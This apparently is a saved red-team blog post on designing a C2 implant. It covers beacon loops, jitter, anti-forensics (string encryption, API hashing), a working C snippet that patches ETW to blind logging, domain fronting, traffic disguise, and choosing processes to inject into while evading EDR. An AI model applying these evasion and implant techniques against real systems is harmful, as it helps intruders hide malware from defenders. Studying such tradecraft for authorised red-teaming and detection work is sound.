@@ -1,0 +1,359 @@
+# https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/
+
+<!DOCTYPE html><html lang="en">
+<body>
+
+  <div class="bg-grid"></div>
+
+  
+
+  <main class="scroll">
+    <div class="pg">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="reading-progress" id="reading-progress" aria-hidden="true" style="transform: scaleX(0);"></div>
+
+<article class="article">
+  
+
+  <div class="article-main">
+    
+
+    
+
+    <div class="article-meta">
+      <span>Mar 20, 2026</span>
+      
+        <span class="wu-diff hard">HARD</span>
+      
+      <span>· 3 MIN READ</span>
+    </div>
+
+    <h1 id="top" class="article-title">Designing a Modern C2 Implant: Architecture and OPSEC</h1>
+    <p class="article-desc">A comprehensive guide to C2 implant architecture - covering communication protocols, execution models, sleep patterns, anti-forensics, and operational security considerations.</p>
+
+    
+    <div class="article-tags">
+      <span class="pill">#c2</span><span class="pill">#implant</span><span class="pill">#architecture</span><span class="pill">#opsec</span><span class="pill">#red-team</span>
+    </div>
+    
+
+    <div id="toc-inline" class="toc-inline">
+      <div class="toc-label">On this page</div>
+      <ol class="toc-list" id="toc-list-inline"><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#core-architecture-decisions" data-target="core-architecture-decisions">Core Architecture Decisions</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#communication-model" data-target="communication-model">Communication Model</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#recommended-layered-approach" data-target="recommended-layered-approach">Recommended: Layered Approach</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#the-beacon-loop" data-target="the-beacon-loop">The Beacon Loop</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#jitter-implementation" data-target="jitter-implementation">Jitter Implementation</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#task-execution-models" data-target="task-execution-models">Task Execution Models</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#in-process-execution-preferred" data-target="in-process-execution-preferred">In-Process Execution (Preferred)</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#fork--run-legacy" data-target="fork--run-legacy">Fork &amp; Run (Legacy)</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#inline-execution-challenges" data-target="inline-execution-challenges">Inline Execution Challenges</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#anti-forensics" data-target="anti-forensics">Anti-Forensics</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#string-encryption" data-target="string-encryption">String Encryption</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#api-hashing" data-target="api-hashing">API Hashing</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#etw-and-amsi-patching" data-target="etw-and-amsi-patching">ETW and AMSI Patching</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#memory-indicators" data-target="memory-indicators">Memory Indicators</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#network-opsec" data-target="network-opsec">Network OPSEC</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#domain-fronting" data-target="domain-fronting">Domain Fronting</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#malleable-traffic-profiles" data-target="malleable-traffic-profiles">Malleable Traffic Profiles</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#certificate-management" data-target="certificate-management">Certificate Management</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#process-injection-opsec" data-target="process-injection-opsec">Process Injection OPSEC</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#testing-your-implant" data-target="testing-your-implant">Testing Your Implant</a></li></ol>
+    </div>
+
+    <div class="prose" id="post-content">
+      <h2 id="core-architecture-decisions">Core Architecture Decisions<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#core-architecture-decisions" aria-label="Copy link to Core Architecture Decisions"><span aria-hidden="true">#</span></a></h2>
+
+<p>Every implant design starts with three questions: How does it talk? How does it execute? How does it hide?</p>
+
+<h3 id="communication-model">Communication Model<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#communication-model" aria-label="Copy link to Communication Model"><span aria-hidden="true">#</span></a></h3>
+
+<p><strong>HTTP/S Polling</strong> - The most common. Implant periodically calls home (beacon) over HTTPS. Pros: blends with web traffic, CDN-compatible. Cons: periodic pattern detectable.</p>
+
+<p><strong>DNS</strong> - Queries to attacker-controlled nameserver. Pros: passes most firewalls. Cons: low bandwidth (TXT records ~ 255 bytes), higher latency.</p>
+
+<p><strong>Named Pipes</strong> - For lateral movement between compromised hosts. One host beacons externally, others chain through internal pipes. Pros: no network egress per host. Cons: requires SMB access.</p>
+
+<p><strong>WebSockets</strong> - Persistent bidirectional connection. Pros: real-time interaction, lower latency. Cons: long-lived connections are anomalous.</p>
+
+<h3 id="recommended-layered-approach">Recommended: Layered Approach<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#recommended-layered-approach" aria-label="Copy link to Recommended: Layered Approach"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>External beacon (HTTPS) ← Edge host
+    ↕ Named Pipe
+Internal host A ← No external network access
+    ↕ Named Pipe
+Internal host B
+    ↕ SMB
+Domain Controller
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<h2 id="the-beacon-loop">The Beacon Loop<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#the-beacon-loop" aria-label="Copy link to The Beacon Loop"><span aria-hidden="true">#</span></a></h2>
+
+<p>The fundamental implant loop:</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="k">loop</span> <span class="p">{</span>
+    <span class="c1">// 1. Sleep with jitter</span>
+    <span class="k">let</span> <span class="n">jitter</span> <span class="o">=</span> <span class="n">base_sleep</span> <span class="o">*</span> <span class="p">(</span><span class="mf">1.0</span> <span class="o">+</span> <span class="nf">random</span><span class="p">(</span><span class="o">-</span><span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.2</span><span class="p">));</span>
+    <span class="nf">sleep_obfuscated</span><span class="p">(</span><span class="n">jitter</span><span class="p">);</span>
+    
+    <span class="c1">// 2. Check in - POST to C2</span>
+    <span class="k">let</span> <span class="n">tasks</span> <span class="o">=</span> <span class="nf">http_post</span><span class="p">(</span><span class="s">"/api/beacon"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">session_metadata</span><span class="p">);</span>
+    
+    <span class="c1">// 3. Execute tasks</span>
+    <span class="k">for</span> <span class="n">task</span> <span class="k">in</span> <span class="n">tasks</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">result</span> <span class="o">=</span> <span class="nf">execute_task</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
+        <span class="n">results</span><span class="nf">.push</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// 4. Return results</span>
+    <span class="k">if</span> <span class="o">!</span><span class="n">results</span><span class="nf">.is_empty</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nf">http_post</span><span class="p">(</span><span class="s">"/api/results"</span><span class="p">,</span> <span class="o">&amp;</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">results</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">rust</span></pre></div></div>
+
+<h3 id="jitter-implementation">Jitter Implementation<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#jitter-implementation" aria-label="Copy link to Jitter Implementation"><span aria-hidden="true">#</span></a></h3>
+
+<p>Without jitter, beacons create a detectable periodic pattern. With 20% jitter on a 30-second base:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>No jitter:  30s, 30s, 30s, 30s → trivially detected
+20% jitter: 26s, 33s, 28s, 35s → harder to fingerprint
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p>Network monitoring tools look for periodicity in connection timing. Always implement jitter.</p>
+
+<h2 id="task-execution-models">Task Execution Models<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#task-execution-models" aria-label="Copy link to Task Execution Models"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="in-process-execution-preferred">In-Process Execution (Preferred)<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#in-process-execution-preferred" aria-label="Copy link to In-Process Execution (Preferred)"><span aria-hidden="true">#</span></a></h3>
+
+<p>Execute everything in the implant’s own process. No child processes, no <code class="language-plaintext highlighter-rouge">cmd.exe</code>, no <code class="language-plaintext highlighter-rouge">powershell.exe</code>. This means:</p>
+
+<ul>
+  <li><strong>BOFs</strong> for extending functionality without new processes</li>
+  <li><strong>Inline .NET assembly</strong> via CLR hosting for C# tools</li>
+  <li><strong>Reflective DLL loading</strong> for complex tooling</li>
+  <li><strong>Direct syscalls</strong> for all sensitive API calls</li>
+</ul>
+
+<h3 id="fork--run-legacy">Fork &amp; Run (Legacy)<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#fork--run-legacy" aria-label="Copy link to Fork &amp; Run (Legacy)"><span aria-hidden="true">#</span></a></h3>
+
+<p>Spawn a sacrificial process, inject shellcode, wait for output, kill the process. Used by older Cobalt Strike payloads. Generates telemetry:</p>
+
+<ul>
+  <li>Process creation events (Event 4688, Sysmon 1)</li>
+  <li>Cross-process injection detection</li>
+  <li>Suspicious parent-child relationships (beacon → notepad)</li>
+</ul>
+
+<h3 id="inline-execution-challenges">Inline Execution Challenges<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#inline-execution-challenges" aria-label="Copy link to Inline Execution Challenges"><span aria-hidden="true">#</span></a></h3>
+
+<p>Memory must be carefully managed. Loaded assemblies and DLLs persist in memory. Implement cleanup routines that zero out and free memory after execution. Watch for CLR artifacts - once the .NET runtime is loaded, it can’t be unloaded.</p>
+
+<h2 id="anti-forensics">Anti-Forensics<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#anti-forensics" aria-label="Copy link to Anti-Forensics"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="string-encryption">String Encryption<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#string-encryption" aria-label="Copy link to String Encryption"><span aria-hidden="true">#</span></a></h3>
+
+<p>Never store strings in plaintext. At minimum, XOR at compile time with a per-build key:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// Compile-time string encryption</span>
+<span class="cp">#define ENC_STR(s, key) encrypted_string(s, sizeof(s)-1, key)
+</span>
+<span class="c1">// Runtime decryption only when needed, zero after use</span>
+<span class="kt">char</span><span class="o">*</span> <span class="n">dec</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">enc_kernel32</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
+<span class="n">HMODULE</span> <span class="n">k32</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="n">dec</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="n">dec</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">dec</span><span class="p">));</span>
+<span class="n">free</span><span class="p">(</span><span class="n">dec</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="api-hashing">API Hashing<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#api-hashing" aria-label="Copy link to API Hashing"><span aria-hidden="true">#</span></a></h3>
+
+<p>Don’t store API function names. Hash them and resolve at runtime:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// djb2 hash of "NtAllocateVirtualMemory"</span>
+<span class="cp">#define H_NtAllocateVirtualMemory 0x1a22c987
+</span>
+<span class="n">FARPROC</span> <span class="nf">resolve</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">hash</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Walk PEB → LDR → module list → export table</span>
+    <span class="c1">// Hash each export name, compare with target</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="etw-and-amsi-patching">ETW and AMSI Patching<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#etw-and-amsi-patching" aria-label="Copy link to ETW and AMSI Patching"><span aria-hidden="true">#</span></a></h3>
+
+<p>Patch before any execution:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// Patch EtwEventWrite → ret</span>
+<span class="kt">void</span><span class="o">*</span> <span class="n">etw</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"EtwEventWrite"</span><span class="p">);</span>
+<span class="n">DWORD</span> <span class="n">old</span><span class="p">;</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">etw</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">old</span><span class="p">);</span>
+<span class="o">*</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">etw</span> <span class="o">=</span> <span class="mh">0xC3</span><span class="p">;</span>  <span class="c1">// ret</span>
+<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">etw</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">old</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">old</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="memory-indicators">Memory Indicators<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#memory-indicators" aria-label="Copy link to Memory Indicators"><span aria-hidden="true">#</span></a></h3>
+
+<p>Cobalt Strike beacons are detected by memory patterns. Your custom implant should:</p>
+<ul>
+  <li>Use unique XOR keys per build (not static)</li>
+  <li>Randomize PE headers or erase them after loading</li>
+  <li>Avoid common magic bytes in configuration blocks</li>
+  <li>Fragment data structures across non-contiguous allocations</li>
+</ul>
+
+<h2 id="network-opsec">Network OPSEC<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#network-opsec" aria-label="Copy link to Network OPSEC"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="domain-fronting">Domain Fronting<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#domain-fronting" aria-label="Copy link to Domain Fronting"><span aria-hidden="true">#</span></a></h3>
+
+<p>Route C2 traffic through CDN so the network connection appears to go to a legitimate site:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>Implant → TLS to cdn.cloudflare.com (SNI)
+       → Host: your-c2.workers.dev (HTTP header)
+       → CDN routes to your C2 based on Host
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<h3 id="malleable-traffic-profiles">Malleable Traffic Profiles<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#malleable-traffic-profiles" aria-label="Copy link to Malleable Traffic Profiles"><span aria-hidden="true">#</span></a></h3>
+
+<p>Customize HTTP requests to mimic legitimate services:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>GET /api/v2/users/profile HTTP/1.1
+Host: api.legitimate-saas.com
+Authorization: Bearer eyJhbG...
+Content-Type: application/json
+X-Request-ID: &lt;encrypted_beacon_data&gt;
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<h3 id="certificate-management">Certificate Management<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#certificate-management" aria-label="Copy link to Certificate Management"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li>Register C2 domains months in advance</li>
+  <li>Get them categorized as “Technology” or “Business”</li>
+  <li>Use Let’s Encrypt for valid certificates</li>
+  <li>Rotate domains on a schedule</li>
+</ul>
+
+<h2 id="process-injection-opsec">Process Injection OPSEC<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#process-injection-opsec" aria-label="Copy link to Process Injection OPSEC"><span aria-hidden="true">#</span></a></h2>
+
+<p>If you must inject into another process, choose targets carefully:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Target Process</th>
+      <th>Risk Level</th>
+      <th>Why</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>explorer.exe</td>
+      <td>Medium</td>
+      <td>Always running, network access normal</td>
+    </tr>
+    <tr>
+      <td>svchost.exe</td>
+      <td>Low-Medium</td>
+      <td>Many instances, network expected</td>
+    </tr>
+    <tr>
+      <td>RuntimeBroker.exe</td>
+      <td>Low</td>
+      <td>Common, short-lived, not heavily monitored</td>
+    </tr>
+    <tr>
+      <td>notepad.exe</td>
+      <td>HIGH</td>
+      <td>No network activity expected - immediate flag</td>
+    </tr>
+    <tr>
+      <td>cmd.exe / powershell.exe</td>
+      <td>CRITICAL</td>
+      <td>Always monitored</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="testing-your-implant">Testing Your Implant<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/#testing-your-implant" aria-label="Copy link to Testing Your Implant"><span aria-hidden="true">#</span></a></h2>
+
+<p>Before operational use, test against:</p>
+
+<ol>
+  <li><strong>Windows Defender</strong> - Baseline AV, catches obvious patterns</li>
+  <li><strong>CrowdStrike Falcon</strong> - Industry-leading EDR, aggressive hooking</li>
+  <li><strong>Elastic Security</strong> - Open rules you can study</li>
+  <li><strong>YARA rules</strong> - Run public CS/Sliver/Mythic rule sets against your binary</li>
+</ol>
+
+<blockquote>
+  <p>The best implant is one that blends in so well it looks like legitimate software. Every decision - from communication timing to process selection to string handling - should answer the question: “Would this look normal to a defender?”</p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+    <section class="related">
+      <div class="label" style="margin-bottom:14px">Continue · C2 development</div>
+      <div class="related-grid">
+        
+          
+          <a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/" class="related-card">
+            <span class="related-date">Apr 17, 2026</span>
+            <span class="related-t">Building a C2 Stack: Implants, BOF Loaders, Redirectors, and DoH Channels</span>
+            <span class="related-desc">A practical end-to-end guide to building command-and-control infrastructure - a minimal...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+          
+          <a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/" class="related-card">
+            <span class="related-date">Apr 09, 2026</span>
+            <span class="related-t">Beacon Object Files from Scratch: COFF Loading, Dynamic Resolution, and Battle-Tested Tradecraft</span>
+            <span class="related-desc">A deep guide to writing Beacon Object Files - from understanding the COFF format and Co...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+      </div>
+    </section>
+    
+
+    
+    
+    
+
+    <div class="article-foot">
+      <a href="https://robinx0.github.io/" class="btn-g">← Home</a>
+      <a href="https://robinx0.github.io/writeups?cat=C2+development" class="btn-g">More C2 development →</a>
+    </div>
+  </div>
+</article>
+
+    </div>
+
+    
+
+  </main>
+
+  
+
+  <!-- Image lightbox -->
+  <div class="lightbox-overlay" id="lightbox">
+    <button class="lightbox-close" type="button" aria-label="Close lightbox">×</button>
+    <button class="lightbox-nav lightbox-prev" type="button" aria-label="Previous image">‹</button>
+    <button class="lightbox-nav lightbox-next" type="button" aria-label="Next image">›</button>
+    <img class="lightbox-img" id="lightbox-img" alt="">
+    <div class="lightbox-caption mono" id="lightbox-caption"></div>
+  </div>
+
+  
+
+
+</body></html>
